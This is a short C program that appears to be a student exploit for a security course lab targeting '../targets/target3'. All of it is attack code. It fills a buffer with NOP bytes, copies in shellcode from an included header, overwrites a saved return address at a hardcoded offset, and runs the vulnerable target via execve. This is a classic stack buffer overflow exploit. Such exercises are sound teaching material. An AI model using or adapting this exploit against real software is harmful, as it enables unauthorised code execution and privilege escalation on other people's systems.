#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	int BUFSIZE = 73;
	char attackBuffer[BUFSIZE];
	int shellcode_length = 45;
	int i;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;	
	}
	for (i = 0; i < 45; i ++){
		attackBuffer[ i] = shellcode[i];
	}
	*(int *) & attackBuffer[68] = 0x3050fe14;
	attackBuffer[72] = NULL;

	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
